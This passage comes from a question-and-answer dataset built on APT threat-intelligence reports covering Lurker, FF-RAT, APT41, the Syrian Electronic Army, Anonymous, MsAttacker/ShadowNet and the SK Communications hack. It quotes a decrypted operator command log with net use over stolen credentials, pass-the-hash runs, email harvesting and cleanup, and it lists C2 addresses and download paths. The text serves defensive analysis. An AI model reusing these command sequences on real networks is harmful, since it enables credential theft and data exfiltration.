decrypted\t\n  the commands from the Trojan.Lurker traffic and\t\n  identified\t\n  the following relevant activity:\n1.\nRS cmd.exe\n2.\nnet use \\\\XX16\\ipc$ \"password\" /u:LOCAL\\username\n3.\nUL C:\\Windows\\IME\\IMEJP\\ntfre.exe   332800\n4.\nUL C:\\Windows\\IME\\IMEJP\\~WRD0208.tmp  134052\n5.\nUL C:\\Windows\\IME\\IMEJP\\~WRD0219.tmp  183148\n6.\nUL C:\\Windows\\IME\\IMEJP\\p8.bat   291\n7.\nntfre e -p\"&uej2&2^@!Ejd3wUDHFsw21\" ~WRD0219.tmp\n8.\nr local\\user1::XXXXXX8F348F93FAD30C70304DXXXXXX:XXXXXX9F20421885C88B11C388XXXXXX::: \"m -s:172.20.240.21 -u:user1 -t:2013-10-15-00 -o:c:\\windows\\ime\\imejp\\mail\"\n9. r local\\user2::XXXXXX8F348F93FAD30C70304DXXXXXX:XXXXXXCCA445FCCD44E6BD66D8XXXXXX::: \"m -s:172.20.240.21 -u:user2 -t:2013-09-15-00 -o:c:\\windows\\ime\\imejp\\mail\"\n10. r local\\user3::XXXXXX8F348F93FAD30C70304DXXXXXX:XXXXXX64AB0C641B0FC741B8C2XXXXXX::: \"m -s:172.20.240.21 -u:user3 -t:2013-09-15-00 -o:c:\\windows\\ime\\imejp\\mail\"\n11.p8.bat 12.rd mail /s/q\n13.del m.exe\n14.del r.exe\nThe APT operator starts this session (1)\t\n \u00a0with the infected system by launching a remote shell (RS). The operator\t\n \u00a0then establishes a\t\n \u00a0network connection (2) using\t\n \u00a0stolen credentials. Several files are\t\n \u00a0then uploaded (UL) to the\t\n \u00a0infected system (3, 4, 5, 6). It\t\n \u00a0should be noted that\t\n \u00a0ntfre.exe is the RAR command line utility, whereas the .tmp files are actually RAR archive\t\n \u00a0files. A very strong\t\n \u00a0RAR password is used to extract (7) the\t\n \u00a0contents of ~WRD0219.tmp RAR archive\t\n \u00a0file. The\t\n \u00a0operator then runs r.exe\t\n \u00a0which is\t\n \u00a0a pass-\u00ad\u2010the-\u00ad\u2010hash\t\n \u00a0tool (8, 9, 10) on\t\n \u00a0three different users, and\t\n \u00a0also\t\n \u00a0executes m.exe, which is an email harvesting\t\n \u00a0tool. The\t\n \u00a0email harvesting\t\n \u00a0tool is passed arguments to only grab a\t\n \u00a0delta\t\n \u00a0of emails, i.e. the actors already have taken\t\n \u00a0all previous emails, and\t\n \u00a0are now only interested\t\n \u00a0on\t\n \u00a0the latest emails. The batch\t\n \u00a0file p8.bat (11) is executed. This file contains the commands shown\t\n \u00a0on\t\n \u00a0Figure 46. The batch\t\n \u00a0file does a couple of things: it\t\n \u00a0extracts the files in archive ~WRD0208.tmp using RAR password: 64740629.\t\n \u00a0This archive file contained the password\t\n \u00a0hash\t\n \u00a0dump\t\n \u00a0utility (PW.exe), which\t\n \u00a0is executed\t\n \u00a0against server XX16, hence the reason\t\n \u00a0for establishing a network connection\t\n \u00a0(2) to\t\n \u00a0that system. The RAR utility (ntfre.exe) is then used to archive the collected emails. The content of the RAR archive (~WRD00h.tmp) is\t\n \u00a0hidden password protected with password happyday (-\u00ad\u2010hphappyday). The rest of the commands are to cleanup (also 12, 13, 14). The RAR file was uploaded successfully to the C2\t\n \u00a0node.\nMedium Headline: 4.4 Parallel Detection with Security Analytics\nDuring the early stages of an intrusion the adversary is typically very busy performing tasks such as moving laterally to additional systems on the\t\n \u00a0network, dumping\t\n \u00a0password hashes, mapping\t\n \u00a0out the\t\n \u00a0network, and stealing\t\n \u00a0data. After they accomplish this part of the\t\n \u00a0mission, the\t\n \u00a0C2\t\n \u00a0channels will go quiet for the\t\n \u00a0most part,\t\n \u00a0by which we mean there maybe outbound\t\n \u00a0connection attempts\t\n \u00a0but there is nothing on the destination node listening on that\t\n \u00a0port.\t\n \u00a0Another symptom of this \"quiet time\"\t\n \u00a0is that the\t\n \u00a0adversary may choose\t\n \u00a0to park their domain names, by which we\t\n \u00a0mean, that the\t\n \u00a0domain names resolve\t\n \u00a0to a\t\n \u00a0legitimate IP address such as a Google IP, or resolve to the loopback address, or some other non-\u00ad\u2010malicious IP. The adversary may occasionally interact with a system on the network to ensure that they still\t\n \u00a0have access to the network, but the activity is typically minimal.\t\n \u00a0The only exception to this behavior is if the adversary comes in for another round of data theft.\t\n \u00a0This current case is\t\n \u00a0a\t\n \u00a0perfect example\t\n \u00a0of this scenario, where\t\n \u00a0at least one\t\n \u00a0of the\t\n \u00a0APT\t\n \u00a0groups has had access to the\t\n \u00a0network for at least \t\n \u00a03 \t\n \u00a0years \t\n \u00a0(since \t\n \u00a02010).\nThis \"quiet time\" presents a challenge to signature based network devices, since there are no payloads to hit on.\t\n  RSA\t\n  IR\t\n  uses a\t\n  simple\t\n  application rule\t\n  within SA to identify suspected sessions in the\t\n  form of TCP\t\n  beaconing. TCP\t\n  beaconing\t\n  is periodic attempts to create a TCP session with the Command and Control infrastructure.\nThe first condition would appear when the remote listener is not listening on that port. There could be any number of reasons for\t\n  this such as an HTRAN10 listener has been shut down or the Trojan server component itself has been shut down.\t\n  \t\n  The packets generally follow the 3, 6, N periodicity. This means that the first SYN packet is sent, 3\t\n  seconds later the second\t\n  SYN packet is sent and 6\t\n  seconds later the\t\n  3rd SYN packet is sent. N stands for the Trojan's internal timer\t\n  for\t\n  attempting\t\n  another connection.\nThe second condition expects a\t\n  response from the server, but usually in the form of RST/ACK\t\n  packets. This would indicate a\t\n  host configuration that resets\t\n  TCP connections\t\n  when a service isn't \t\n  bound \t\n  to \t\n  that \t\n  TCP \t\n  port.\nThe domains for these TCP\t\n  beaconing sessions can be determined by taking the destination IP\t\n  address and looking for DNS sessions\t\n  in alias.ip. Alias.ip is\t\n  populated by the Advanced DNS parser available through the Security Analytics Live content\t\n  distribution\t\n  system.\t\n  This metadata is generated when a domain lookup results in a valid IP address.\t\n  A partial\t\n  view\t\n  of the metadata on\t\n  a DNS lookup\t\n  for drometic.suroot.com is shown below:\nThe network traffic for Trojan.FF-\u00ad\u2010RAT was initially discovered\t\n \u00a0with\t\n \u00a0the following rule.\n\u2022 service = 0\n\u2022 lifetime \t\n \u00a0= \t\n \u00a050-\u00ad\u2010u\n\u2022 tcp.dstport\t\n  = 80,81,8000,8080,8443,443,53,21,22,23,10443,1080\n\u2022 risk.info = 'flags_syn'\nThis rule looks for traffic that has not been identified by the Security Analytics Service parsers, has been established for more than 50 seconds on well-\u00ad\u2010known ports as well as containing\t\n \u00a0the TCP Flag\t\n \u00a0SYN. Security\t\n \u00a0Analytics attempts to identify\t\n \u00a0sessions based\t\n \u00a0on\t\n \u00a0the layer 3 and\t\n \u00a0layer 4 information\t\n \u00a0such\t\n \u00a0as IP address and\t\n \u00a0source/destination\t\n \u00a0ports. Sessions that grow to\t\n \u00a0over 32MB or over 60\t\n \u00a0seconds in duration \t\n \u00a0are \t\n \u00a0declared \t\n \u00a0a \t\n \u00a0complete \t\n \u00a0session \t\n \u00a0and \t\n \u00a0sent \t\n \u00a0to \t\n \u00a0the \t\n \u00a0parser \t\n \u00a0logic \t\n \u00a0and \t\n \u00a0written \t\n \u00a0to \t\n \u00a0disk.\t\n \u00a0\t\n \u00a0Long TCP\t\n \u00a0sessions or large downloads will leave session fragments in Security Analytics, so keying off of the TCP\t\n \u00a0Flag SYN, we can find the beginning of\t\n \u00a0such sessions and\t\n \u00a0reduce the amount of data the analyst has to\t\n \u00a0inspect.\nThe payload discovered in these sessions contains\t\n \u00a0encoded binary\t\n \u00a0data with a single byte XOR key. The XOR key\t\n \u00a0was easy\t\n \u00a0to derive from the traffic as it is exposed\t\n \u00a0when\t\n \u00a0XOR-\u00ad\u2010ing \t\n \u00a0NULL \t\n \u00a0bytes.\t\n \u00a0\t\n \u00a0Applying this key to the payload data yielded a Global Unique Identifier (GUID).\n10 http://www.secureworks.com/cyber-\u00ad\u2010threat-\u00ad\u2010intelligence/threats/htran/\nFurther analysis revealed more\t\n \u00a0details about the\t\n \u00a0structure\t\n \u00a0of the payload\t\n \u00a0and\t\n \u00a0a FLEX\t\n \u00a0XML parser was developed\t\n \u00a0to\t\n \u00a0aid\t\n \u00a0in\t\n \u00a0discovering more hosts infected\t\n \u00a0with\t\n \u00a0this variant of FF-\u00ad\u2010RAT.\nRead the text above and answer this question: What specific techniques did the RSA IR team use to detect and analyze the network traffic associated with Trojan.FF-RAT, and how did they decode the payload to identify infected hosts?",
    "output": "The RSA IR team detected the network traffic associated with Trojan.FF-RAT using a rule that looked for traffic not identified by Security Analytics Service parsers, established for more than 50 seconds on well-known ports, and containing the TCP Flag SYN. They reduced the amount of data to inspect by focusing on the beginning of long TCP sessions. The payload discovered in these sessions contained encoded binary data with a single byte XOR key, which was easy to derive from the traffic. Applying this key to the payload data yielded a Global Unique Identifier (GUID). Further analysis revealed details about the structure of the payload, and a FLEX XML parser was developed to aid in discovering more hosts infected with this variant of FF-RAT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nThis Is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits\nBeginning this year, FireEye observed (<https://content.fireeye.com/apt-41/rpt-apt41/>)Chinese actor APT41 carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed (<https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html>)APT41 attempt to exploit vulnerabilities in (<https://nvd.nist.gov/vuln/detail/CVE-2019-19781>)Citrix NetScaler/ADC, Cisco routers, and (<https://nvd.nist.gov/vuln/detail/CVE-2020-10189>)Zoho ManageEngine Desktop Central at over 75 FireEye customers. Countries we've seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA. The following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government, Healthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas, Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It's unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature.\n\nWhy did APT41 choose to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central during their global intrusion campaign? How does understanding these targets help cybersecurity experts in improving their defenses against similar attacks?",
    "output": "APT41 chose to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central because these systems are widely used across various industries and geographies, providing a broad attack surface. By targeting these systems, APT41 could potentially gain access to a large number of organizations. Understanding these targets helps cybersecurity experts in several ways: it highlights the importance of regularly patching and updating critical infrastructure components, emphasizes the need for robust network segmentation to limit the impact of successful exploits, and underscores the necessity of continuous monitoring and incident response planning to detect and mitigate such advanced persistent threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The Syrian Electronic Army (SEA)\nThe Syrian Electronic Army is a public online political group that emerged in 2011 to support Syrian President Bashar al-Assad and his regime. The army arose days after Syria lifted its online ban of Facebook and YouTube. SEA was once managed by the Syrian Computer Society, which was headed by President al-Assad in the 1990s. The Syrian Computer Society, which regulates the internet within Syria, even registered the SEA website. The SEA may be partially or entirely supported by the Syrian government. At present, the SEA's domain is no longer hosted by the Syrian Computer Society and it claims no ties to the government. Based on the aptitude at social media and the humor used on defaced sites, the army likely consists of young adult males. One \"inside source\" claimed that the group consisted of nine Syrian college students; however, no other sources have verified this claim.\nBy all appearances, the SEA conducts attacks to garner global attention rather than to steal data or financial information. The SEA primarily targets media outlets and journalists, political groups that oppose al-Assad's regime, human rights groups, and western organizations. Most SEA attacks target the websites and social media accounts of United States news organizations because it argues that the outlets spread anti-Syria propaganda. The SEA uses malware and phishing campaigns to actively monitor Syrian rebels and members of Human Rights groups.\nSEA attacks begin with phishing through spam or spear phishing using detailed information obtained from previous campaigns. The SEA attempt to gain user credentials, which it then uses to seize control of the websites and social media accounts of prominent organizations. The army has attacked the websites and/or social media accounts of: \"60 Minutes,\" Al-Jazeera, Associated Press, BBC News, CBC News, CNN, The Daily Telegraph, Financial Times, The Guardian, The Onion, National Public Radio, The New York Times, Reuters, Time, and The Washington Post. Once it has control, The SEA posts fake stories or news and collects any confidential information that could be useful in future attacks, such as contact names. When phishing attempts fail, SEA may resort to malware, website defacement through web exploits, or denial of service attacks leveraging botnets. If no attack vector succeeds, then the SEA resorts to bombarding the social media accounts of its target with pro-Syria messages.\nMost attacks amount to a banner ad or redirection to a site that supports al-Assad; however, the attacks can have tangible impacts. When the SEA hacked the Associated Press Twitter account in 2013, they posted a message that the White House had been bombed and that President Obama was injured. The post resulted in a noticeable impact on the DOW Jones and the S&P 500 Index (~$136.5 billion).\nIn their attack on the New York Times, the SEA demonstrated the ability to breach a major domain registrar, Melbourne IT, using stolen credentials and redirect internet traffic or seize ownership of domains, such as Twitter. The SEA has also compromised the GoDaddy domain registrar, social media management services, and third party applications that serve news articles. The attack on a registrar indicates that the SEA may begin to attack third party services and underlying infrastructure in order to compromise its target. Recently, the SEA has attacked larger targets such as Microsoft, Facebook, EBay, and PayPal through the underlying infrastructure.\nMedium Headline: Anonymous\nAnonymous is a collective of hacktivists and script kiddies which originated in 2003 on the website 4chan. In the traditional sense, Anonymous is more of a cyber-mob than an advanced persistent threat; however, the group's construction and global membership afford it significant influence and resilience to law enforcement efforts. Anonymous has established a brand name with the physical weight of a cohesive advanced persistent threat group. Anonymous has a decentralized command structure and it unties its members through anarchic ideology. Essentially, the loosely affiliated members or member groups work towards goals that they agree upon or remain inactive or split off, if they do not agree. Dissent is common within the group and one of the largest difficulties in profiling Anonymous is that the only absolutely unifying characteristic is membership in the group. Some members participate to deface websites and prank organizations while other members participate because Anonymous affords them a serious political activism platform. Most of the members support the foundational anti- censorship and anti-control platform and they target entities accused of censoring the people. Members, Anons, range from non-technical supporters to active blackhat hackers. Essentially, if an individual believes in the Anonymous cause or simply says that they are a member, then they are part of the collective. Anonymous members are told to neither reveal their identity or to discuss the group. The sense of membership and ease of access has allowed a few skilled hackers in Anonymous to hide amongst massive crowds of protesters.\nAnonymous began by attacking the Church of Scientology, but its scope rapidly expanded. Since then, Anonymous has protested mass surveillance, anti-digital privacy efforts, governments, financial institutions, and individual users. More specifically, Anonymous has targeted the MPAA, the RIAA, Sony, the Church of Scientology, the Westburo Baptist Church, government entities in the United States, Canada, Israel, Tunisia, and Uganda, PayPal, MasterCard, Visa, and child smuggling and child prostitution rings. Anonymous supported the Occupy movement against large businesses, and it supported the Arab Springs movement against oppressive regimes in the Arab region. The media is the only sector that Anonymous members are prohibited from targeting.\nAnonymous defaces websites and organizes distributed denial of service attacks (DDoS). Hacked websites may feature the pivotal picture of the Guy Fawkes mask, it may feature a manifesto claiming responsibility for the attack, or it may simply display an internet meme. DDoS attacks are conducted with Gigaloader, JMeter, or the Low Orbit Ion Cannon\n(LOIC) applications. These tools flood a server with inbound TCP or UDP packets. Botnets belonging to members of the group are often added to DDoS campaigns. In some attacks, these botnets account for up to 90% of the malicious traffic.\n\nWhat is the organizational structure and ideology of Anonymous, and how do these factors contribute to their resilience and influence? How do they choose their targets and what methods do they typically use in their attacks?",
    "output": "Anonymous is a decentralized collective of hacktivists and script kiddies with a global membership, which contributes to their resilience and influence. They are united by an anarchic ideology and a foundational anti-censorship and anti-control platform. Members range from non-technical supporters to active blackhat hackers. Anonymous chooses targets based on accusations of censorship or control, including entities like the MPAA, RIAA, Sony, various governments, financial institutions, and child smuggling rings. Their methods include website defacement and distributed denial of service (DDoS) attacks using tools like Gigaloader, JMeter, and the Low Orbit Ion Cannon (LOIC), often supplemented by botnets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SUMMARY\n\uf0b7 Hundreds of members of the Tibetan community are being targeted by email-based malware attacks that leverage the March 10 Tibetan Uprising anniversary as a theme.\n\uf0b7 This report analyzes two March 10 related attacks. One using a new malware family we call \"MsAttacker\" that we have not observed before, and another using the ShadowNet malware family and command and control infrastructure related to previous campaigns known to have targeted the Tibetan community.\n\uf0b7 We include user recommendations for preventing infection and indicators of compromise for researchers to identify MsAttacker.\nBig Headline: ATTACK 1: MSATTACKER\nOn March 5 2015, an email with the subject line \"10th March 2015 campaign for Tibet\" was sent to hundreds of individuals and organizations from the Tibetan community. The email purported to come from a well-known Tibetan NGO and contained information about a series of events planned to commemorate the 56th anniversary of the Tibetan Uprising.\nAttached to the email was a malicious Microsoft Word file \"10th March.doc\" that used the exploit , which is a vulnerability in how Microsoft Word handles RTF documents. This vulnerability has but has remained the most frequently used CVE we have for the last two years. Its repeated usage suggests that attackers are successfully compromising members of the community, because their systems do not have the latest software updates. The exploit was used to deliver a malware family that does not match any available signatures and has not been observed by us in previous attacks against the Tibetan community.\nThe malware first connects to a command and control server (C2) 122.10.117.152 located in .\nThe malware then downloads a stage 2 binary: [c2 ip]/download/ms/MiniJs.dll\nThis file is copied to c:\\windows\\system32\\teamviewsvc.dll and creates a service to run on startup. It then connects to 23.27.127.200 to receive further requests.\nWe call this family \"MsAttacker\" after an event name in the stage 2 binary.\nWe were also provided with another sample of MsAttacker that was also sent on March 5 in a highly targeted attack against a Tibet-related NGO. The email contained information about a private event the group was planning that was unrelated to March 10 activities. The attachment contained the same payload as the first March 10 related attack.\nWe found one other example of this malware in the wild. On March 5, an analysis of a file \"WTO. non-market status China _1_.doc\" was (a community malware analysis platform). This sample was from the same family and also connected to 122.10.117.152.\nBig Headline: ATTACK 2: SHADOWNET\nIn another attack on March 5, members of a Tibetan human rights organization received an email appearing to come from the group's organizational mailing list. The email message contained information from the secretary of the Bureau of His Holiness the Dalai Lama regarding events related to March 10. Attached was a malicious Microsoft Word file that had the same filename as the previous attack (10th March.doc) and also used CVE-2012-0158. However, the malware used in this attack is from the ShadowNet family.\nShadowNet malware leverages , a system tool meant for administrators. Its intended usage as a tool for collecting system information and automation makes it an ideal mechanism for gathering and exfiltrating data. The use of legitimate Windows features can make it more difficult for administrators to identify activity as malicious.\nShadowNet typically uses that first connects to blog websites and then retrieves C2 information from encoded strings left on the blog. By using blog sites as intermediaries the attackers can maintain control of compromised machines even if a C2 is blocked by a network firewall or otherwise goes down. If a C2 needs to be updated the attackers can simply point the intermediaries to new servers.\nThe sample used in this attack includes a WMI Script with links to three blogs (hxxp://johnsmith152.typepad.com/blog/rss.xml; hxxp://mynewshemm.wordpress.com/feed/; hxxp://johnsmith5382.thoughts.com/feed). The blogs contain an encoded string that points to the actual C2: hxxp://www.semamail.info/firex/test.php, which has the IP 122.10.117.5 and is on the same Autonomous System (AS 24544) as the C2 for the MsAttacker sample. Apart from this commonality and the timing of the attack we do not observe any other linkages between the MsAttacker and ShadowNet attacks.\nThe domain (semamail.info) has questionable :\nRegistrant Name: Kasong Dolma\nRegistrant Street: New York\nRegistrant City:New York\nRegistrant State/Province:guangdong\nRegistrant Postal Code:10001\nRegistrant Country:CN\nRegistrant Phone:+1.9175608889\nRegistrant Email:\nThis same registration information has been used for a number of other domains including conamail.info, convmail.info, and fifamp3.info. The domain fifamp3.info resolves to 122.10.117.35. records show that the same IP has pointed to rukiyeangel.dyndns.pro, which is related to C2 infrastructure used in the and campaigns. ShadowNet was also used in both of these campaigns. The overlap between C2 infrastructure and malware families suggests some level of coordination between this new attack and the previous campaigns.\nBig Headline: CONCLUSION AND RECOMMENDATIONS\nThese attacks are a reminder that members of the Tibetan community are consistently targeted, and that the threat seems to increase during important Tibetan events.\nThese kinds of attacks can be mitigated through greater user awareness and changes in behaviour. Users in targeted communities should always be cautious about unsolicited emails containing links or attachments and should carefully examine the email sender addresses in suspicious messages.\nViewing documents through the Gmail preview feature, or by uploading them to Google Docs to view them can make it possible to look at the content of attachments of a machine. Suspicious files can also be submitted to (but should not be submitted if the files contain personal information) or shared with technical experts within the community.\nFor further resources on digital security the Citizen Lab recommends Tibet Action Institute's project. We are continuing to closely analyze these attacks and the MsAttacker malware family.\nWe will post further details as they become available.\nQ: Explain how the ShadowNet malware uses legitimate Windows features and blog websites as intermediaries for command and control (C2) communication, and discuss the implications of this approach for network administrators.",
    "output": "The ShadowNet malware leverages Windows Management Instrumentation (WMI), a legitimate system tool meant for administrators. Its intended usage for collecting system information and automation makes it an ideal mechanism for gathering and exfiltrating data. The use of legitimate Windows features can make it more difficult for administrators to identify activity as malicious. Additionally, ShadowNet typically uses WMI scripts with links to blog websites that retrieve C2 information from encoded strings left on the blogs. By using blog sites as intermediaries, the attackers can maintain control of compromised machines even if a C2 is blocked by a network firewall or otherwise goes down. If a C2 needs to be updated, the attackers can simply point the intermediaries to new servers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: BACKGROUND\nOn 28\t July\t 2011 SK Communications announced\t it had\t been the subject of\t a hack which\t resulted in the theft\t of\t the personal details of up\t to 35 million people1 .\t The attackers infected a number of SK\t Communications computers with malicious software (malware) and, by issuing command and control (C2) instructions to the malware, were able to\t gain access to,\t and\t exfiltrate large quantities of\t data.\t The attack itself\t was complex,\t well planned and likely\t part of a broader, concerted hacking effort attributable to\t an Advanced Persistent Threat2 .\n1 For details\t of the hack refer to the Command\t Five paper 'SK Hack by an Advanced\tPersistent Threat'. (Command\t Five Pty Ltd, 2011)\n2 For a definition of the term 'Advanced\t Persistent Threat'\t refer to the Command Five paper 'Advanced\t Persistent Threats: A Decade in Review'. (Command Five Pty Ltd, 2011)\nThe malware used\t in the attack was programmed to\t communicate with several 'callback' domains. The malware located its C2 server(s) by resolving these domains into IP\t addresses using\t the ubiquitous Domain Name System\t (DNS) 3 protocol.\t These communications are depicted\t in Figure 1.\n1. Using the Domain Name System (DNS) protocol, the computer asks a DNS server for directions to the callback domain.\n2. The DNS server advises that the callback domain is located at IP address x.x.x.x.\n3. The malware communicates with the C2 server located at IP address x.x.x.x to obtain C2 instructions and/or to send a response.\n4. The C2 server provides additional C2 instructions to the malware.\n\nQ: How did the malware used in the SK Communications attack locate its Command and Control (C2) servers, and what role did the Domain Name System (DNS) protocol play in this process? Explain the steps involved.",
    "output": "A: The malware used in the SK Communications attack located its Command and Control (C2) servers by utilizing the Domain Name System (DNS) protocol. The process involved several steps: First, the malware would use the DNS protocol to query a DNS server for the IP address associated with a predefined 'callback' domain. The DNS server would then respond with the corresponding IP address. Once the malware obtained the IP address, it would establish communication with the C2 server located at that IP address. This communication allowed the malware to receive further C2 instructions and potentially send responses back to the C2 server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 5 Conclusion\nThe global internet offers military and intelligence agencies the opportunity to expand and enhance IW, and it simultaneously presents their targets and victims with novel challenges. Russian IW \u2013 both in traditional media and in cyberspace \u2013 tangibly contributed to the successful annexation of Crimea, and is playing an important role in the ongoing crisis in eastern Ukraine. On balance, this author believes that Russia, and not the West, currently has the lead in contemporary IW.\nUnlike propaganda in Soviet times, which was largely a unidirectional, top-down phenomenon, today's IW encompasses a worldwide audience that is both narrative-bearing and narrative-developing. Domestic, diaspora, and foreign audiences interact with current events in real time as they travel through online platforms such as social media. This dynamic makes it more challenging for propagandists to predict how and where the narrative will evolve, but to some degree it is possible to presume how certain political groups will interpret the narrative and how they will describe it to their followers.\nIn sum, the traditional 'fog of war' has changed in the internet era. The ubiquity and anonymity of internet communications offer all nations including Russia\n46 Markku Lonkila. 'Russian Protest On-and Offline: The role of social media in the Moscow opposition demonstrations in December 2011.' UPI FIIA Briefing Papers 98, 2012.\nIn sum, the traditional 'fog of war' has changed in the internet era.\nnew IW opportunities, even as defenders also have more tools and tactics at their disposal to counter hostile actions. In Ukraine, 'conventional' cyber attacks by Russia were negligible,47 but social media-based, narrative-focused attacks including disinformation have been common. And while it is possible to counter adversary operations with accurate open source analysis (for journalists,48 scholars, and activists49), this is unfortunately difficult to do in a timely manner.\n47 However, even unsophisticated cyber attacks such as DDoS and website defacements tend to garner widespread media exposure, and can sow distrust in the security of systems. This occurred during the invasion of Crimea, when Russia sought to capitalise on events that unfolded far too quickly for methodical information analysis to take place.\n48 Jessikka Aro.'Yle Kioski Investigated: This is How Pro-Russia Trolls Manipulate Finns Online \u2013 Check the List of Forums Favored by Propagandists'. YLE Kioski, 24 June 2015. (<http://kioski.yle.fi/omat/troll-piece-2-english>)http://kioski.yle.fi/omat/troll-piece-2-english.\n49 Sites such as www.stopfake.org were launched inviting people to join the 'struggle against fake information about events in Ukraine' by verifying online allegations. 'Stopfake.org.' 2015. Accessed: 14 June 2015. (<http://www.stopfake.org>)http://www.stopfake.org; 'Bellingcat kontert Kritik mit neuen Satellitenbildern'. Zeit Online. 12 June 2015. (<http://www.zeit.de/politik/ausland/2015-06/bellingcat-russland-mh17-satellitenfotos-manipulation>)www.zeit.de/politik/ausland/2015-06/bellingcat-russ-(<http://www.zeit.de/politik/ausland/2015-06/bellingcat-russland-mh17-satellitenfotos-manipulation>)land-mh17-satellitenfotos-manipulation; Dmitry Volchek and Claire Bigg. 'Ukrainian bloggers use social media to track Russian soldiers fighting in east'. The Guardian, 3 June 2015. (<http://www.theguardian.com/world/2015/jun/03/bloggers-social-media-russian-soldiers-fighting-in-ukraine>)http://www.theguardian.com/world/2015/jun/03/bloggers-social-(<http://www.theguardian.com/world/2015/jun/03/bloggers-social-media-russian-soldiers-fighting-in-ukraine>)media-russian-soldiers-fighting-in-ukraine.\nSmall Headline: 1 Introduction\nIn the Russo-Ukrainian conflict, there has been much talk of 'hybrid warfare', encompassing every aspect of war including cyber operations. Much of cyber operations is classified and hidden from public view, but there are numerous ways in which information becomes known, including via intelligence leaks and open source analysis. This chapter focuses on leadership communications and what they can tell us about conflict in cyberspace.\nIn geopolitics, heads of state are the ultimate decision-makers, especially during a national security crisis. Leaders are expected to show rhetorical as well as executive leadership. The media takes it from there, but the public still struggles to find a consistent evaluation, primarily relying on experts and opinion leaders.1 As the head of state seeks his or her 'rally around the president' moment,2 domestic and international observers analyse their explanations and emotions \u2013 as well as their proffered initiatives and guidance.3 From a national podium, heads of state have an inherent advantage, as their arguments are 'more likely to resonate with the public than the opinions of leaders voicing a more local outlook'. 4\nCommunication and discourse analysis in international affairs rests on the idea that language cannot be taken at face value. Words carry definitional meaning, but dif-\nferent audiences will perceive them differently. Critical analysis can yield insight into the true beliefs and motivations of any speaker, including policy-makers. Meaning is 'mediated through language'5 and all words have 'social values'6 that vary with context.\n1 Timothy E Cook. Governing with the News (Chicago and London: University of Chicago Press, 1998).\n2 Birgitte Lebens Nacos. Terrorism and the Media: From the Iran Hostage Crisis to the Oklahoma City Bombing (New York: Columbia University Press, 1996).\n3 Jeffrey E Cohen. Presidential Responsiveness and Public Policy-Making, The Public and the Policies That Presidents Choose (Ann Arbor: The University of Michigan Press, 1997).\n4 Ibid, 32.\nThis chapter analyses Russian and Ukrainian leadership statements, speeches, press releases and other rhetoric from 2014 and 2015, especially the English-language elements, written for a global audience and printed in international media. The author also searched major international news outlets for the keywords 'Ukraine', 'Russia', 'cyber', and 'information warfare'. In all cases, focus remained on the rhetoric attributable to a head of state or other high-level political player,7 with an eye toward uncovering their underlying motivations, beliefs, and ideologies.\nSmall Headline: 2 Analytical Focus\nThis analysis is designed to yield insight into numerous areas of international concern. Above all, the world would like to understand more about the emerging threat of cyber warfare. New developments in research and technology, as well as in the means and methods of war, are usually far ahead of their codification in doctrine.\nAn analysis of political rhetoric may yield significant insight into what politicians cannot discuss in public forums.\nComputer network operations fit nicely within the concept of hybrid warfare that has been so characteristic of the Russo-Ukrainian conflict. Cyber attacks are similar to covert operations, information operations, denial and deception, false flag and no-flag attacks: they give national command and control structures some degree of plausible deni-ability. These aspects of war tend to be highly classified; therefore, an analysis of political rhetoric may yield significant insight into what politicians, soldiers and spies simply cannot discuss in public forums, namely, one of the most vexing challenges of cyber attacks: attribution.\nPolitical leaders must appeal to the hearts and minds of their domestic and international audiences, with the help of emotional and sometimes long-winded speeches. National security establishments must provide legal support for their actions through the release of press statements and promulgation of doctrine. With these in hand, analysts may be able to understand much more about the otherwise covert nature of cyber attacks. In 2015, Russia has a fairly well-developed military doctrine on cyber and information warfare, while that of Ukraine is still in its infancy. This analysis offers a deeper understanding of each nation's non-explicit political objectives related to cyber warfare.\n5 Henrik Larsen. Foreign Policy and Discourse Analysis: France, Britain and Europe (London: Routledge advances in International Relations and Politics, 1997), 11.\n6 Ibid, 14.\n7 Unfortunately, on the current 'President of Ukraine' website, documents and speeches by former Ukrainian President Viktor Yanukovych cannot be found.\nQ: How does the analysis of leadership communications provide insights into the covert nature of cyber attacks, and what specific aspects of cyber warfare can be understood through this method?",
    "output": "The analysis of leadership communications, such as speeches, press releases, and other rhetoric, can provide significant insights into the covert nature of cyber attacks. By examining the language and underlying motivations of political leaders, analysts can gain a deeper understanding of otherwise classified aspects of cyber warfare. Specifically, this method can shed light on the attribution of cyber attacks, which is one of the most vexing challenges in this domain. Political leaders often use emotional and long-winded speeches to appeal to their audiences, and national security establishments release press statements and doctrine to provide legal support for their actions. These communications can reveal non-explicit political objectives related to cyber warfare.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
